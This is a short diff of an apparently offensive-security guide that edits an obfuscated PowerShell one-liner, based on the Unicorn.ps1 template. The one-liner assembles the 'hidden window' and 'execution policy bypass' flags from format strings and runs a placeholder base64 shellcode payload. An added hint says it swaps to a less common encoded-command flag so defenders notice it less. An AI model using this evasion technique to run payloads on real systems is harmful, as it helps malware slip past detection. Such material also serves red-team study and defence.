@@ -622,9 +622,12 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - File **Unicorn.ps1** (base64 shellcode execution)
 
-      $syscall=("{1}{0}" -f'N','-Wi'); $flag=("{1}{0}{2}" -f'Id','h','DEn'); $cert=("{1}{0}" -f'p','-E'); $pem=("{1}{2}{0}" -f'SS','by','pA'); powershell $syscall $flag $cert $pem -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"
+      $syscall=("{1}{0}" -f'N','-Wi'); $flag=("{1}{0}{2}" -f'Id','h','DEn'); $cert=("{1}{0}" -f'p','-E'); $pem=("{1}{2}{0}" -f'SS','by','pA'); powershell -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "n"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell $syscall $flag $cert $pem (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"
 
-![powershell obfuscation](http://i.cubeupload.com/CzJJc0.png)
+![powershell obfuscation](http://i.cubeupload.com/kD8nqd.png)
+
+      HINT: I have re-written REL1K's template to accept -WiN hIdDEn -Ep bYpASS (reorder obfuscation)
+      and change the powershell 'EncodingCommand' from -ec to -en (less used flag by pentesters).
 
 ---
 
